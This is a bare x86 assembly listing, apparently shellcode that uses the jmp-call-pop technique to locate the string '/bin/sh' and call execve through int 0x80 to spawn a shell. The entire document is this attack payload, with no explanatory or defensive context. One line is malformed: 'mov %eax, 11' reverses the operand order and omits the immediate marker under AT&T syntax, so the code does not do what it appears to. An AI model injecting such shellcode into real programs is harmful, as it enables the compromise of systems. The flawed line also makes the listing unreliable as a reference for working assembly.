

.text
_start:
   jmp string
   
main:
   pop %ebx
   xor %ecx, %ecx
   xor %edx, %edx
   mov %eax, 11
   int 0x80

string:
   call main
.string "/bin/sh\x00"
